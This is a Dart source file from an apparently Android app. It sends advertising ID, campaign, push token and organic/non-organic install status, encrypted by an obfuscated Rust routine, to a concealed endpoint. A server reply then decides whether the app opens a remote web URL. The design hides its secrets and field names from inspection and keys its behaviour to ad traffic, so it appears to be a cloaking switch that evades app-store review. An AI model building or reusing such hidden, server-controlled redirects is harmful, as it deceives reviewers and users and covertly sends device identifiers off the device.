// DecreeFetch — single-shot POST to the sealed edge/sync endpoint.
//
// We NEVER build the JSON envelope here. The payload is handed to the
// Rust `rg_pack` entry point which:
//   • reads the HMAC secret, field names, schema rev, UA default
//     straight from its sealed slots;
//   • performs XOR-SHA keystream encryption + HMAC-SHA256 tag;
//   • returns ready-to-send JSON bytes.
//
// This way the keystream secret and the field names/alphabet never show
// up on the Dart heap.

import 'dart:convert';
import 'dart:math' as math;

import '../../prism/rust_guard.dart';
import '../../prism/sealed_bytes.dart';
import '../compass/harbor.dart';
import '../current/anchor_vault.dart';
import 'wire_runner.dart';

class DecreeFetch {
  DecreeFetch._();
  static final DecreeFetch instance = DecreeFetch._();

  final _rng = math.Random.secure();

  Future<Decree?> ask({
    required bool isFirstLaunch,
    required Map<String, String> breadcrumbs,
  }) async {
    final body = <String, dynamic>{
      'af_status': (breadcrumbs['media_source'] ?? '').isNotEmpty
          ? 'Non-organic'
          : 'Organic',
      'bundle_id': Sealed.bundleId,
      'os': 'Android',
      'store_id': Sealed.bundleId,
      'media_source': breadcrumbs['media_source'] ?? '',
      'campaign_id':  breadcrumbs['campaign_id']  ?? '',
      'af_c_id':      breadcrumbs['campaign_id']  ?? '',
      'campaign':     breadcrumbs['campaign']     ?? '',
      'advertising_id': breadcrumbs['gaid']       ?? '',
      'af_id':        breadcrumbs['af_id']        ?? '',
      'push_token':   breadcrumbs['push_token']   ?? '',
      'deep_link':    breadcrumbs['deep_link']    ?? '',
      'is_first_launch': isFirstLaunch,
    };
    final rawBody = utf8.encode(jsonEncode(body));
    final nonce = List<int>.generate(16, (_) => _rng.nextInt(256));
    final envelopeBytes = RustGuard.instance.pack(rawBody, nonce);
    if (envelopeBytes.isEmpty) return null;

    final uri = Uri.parse(Sealed.edgeEndpoint);
    try {
      final res = await WireRunner.instance
          .postJson(uri, utf8.decode(envelopeBytes));
      if (res.statusCode != 200) return null;
      final decoded = jsonDecode(res.body);
      if (decoded is! Map) return null;
      final ok = decoded['ok'] == true;
      if (!ok) {
        await AnchorVault.instance
            .rememberDecree(openWeb: false);
        return const Decree(openWeb: false);
      }
      final url = decoded['url'];
      final exp = decoded['expires'];
      DateTime? expAt;
      if (exp is int) {
        expAt = DateTime.fromMillisecondsSinceEpoch(exp * 1000);
      }
      if (url is String && url.startsWith('http')) {
        await AnchorVault.instance.rememberDecree(openWeb: true, url: url);
        return Decree(openWeb: true, url: url, expiresAt: expAt);
      }
      await AnchorVault.instance.rememberDecree(openWeb: false);
      return const Decree(openWeb: false);
    } catch (_) {
      return null;
    }
  }
}
